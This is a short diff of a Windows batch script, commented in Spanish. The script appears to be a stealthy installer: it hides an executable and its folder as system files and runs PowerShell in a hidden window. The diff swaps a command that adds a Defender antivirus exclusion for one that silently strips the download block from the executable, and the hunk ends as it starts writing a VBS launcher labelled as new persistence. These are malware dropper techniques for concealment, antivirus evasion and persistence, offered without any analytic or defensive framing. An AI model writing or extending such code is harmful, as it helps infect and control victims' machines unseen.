@@ -66,7 +66,7 @@ if not exist "%DIR%\%EXE%" (
 attrib +h +s "%DIR%\%EXE%" >nul 2>&1
 attrib +h "%DIR%" >nul 2>&1
 
-powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
+powershell -NoProfile -WindowStyle Hidden -Command "Unblock-File -Path '%DIR%\%EXE%' -ErrorAction SilentlyContinue" >nul 2>&1
 
 :: --- 6) lanzador y persistencia nueva ---
 > "%DIR%\%VBS%" echo Set sh = CreateObject("WScript.Shell")
